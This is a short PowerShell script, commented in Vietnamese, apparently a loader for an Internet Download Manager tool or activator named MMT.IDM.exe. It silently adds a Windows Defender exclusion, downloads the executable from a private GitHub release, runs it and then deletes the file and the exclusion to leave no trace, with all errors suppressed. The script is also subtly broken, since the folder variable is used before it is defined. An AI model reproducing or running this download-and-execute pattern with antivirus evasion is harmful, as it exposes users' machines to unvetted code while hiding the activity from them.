# Thêm exclusion (không hiển thị chi tiết)
Add-MpPreference -ExclusionPath $folderPath -Force -ErrorAction SilentlyContinue

# Đường dẫn thư mục và file
$folderPath = "$env:USERPROFILE\AppData\Local\Temp\MMTPC"
$filePath   = Join-Path $folderPath "MMT.IDM.exe"

# Tạo thư mục nếu chưa tồn tại
if (-not (Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
}


# Tải và chạy file
Invoke-WebRequest -Uri "https://github.com/ghostminhtoan/private/releases/download/MMT/MMT.IDM.exe" -OutFile $filePath -ErrorAction SilentlyContinue

if (Test-Path $filePath) {
    Start-Process -FilePath $filePath -Wait
    Remove-Item $filePath -Force -ErrorAction SilentlyContinue
}

# Xóa exclusion (không hiển thị chi tiết)
Remove-MpPreference -ExclusionPath $folderPath -Force -ErrorAction SilentlyContinue
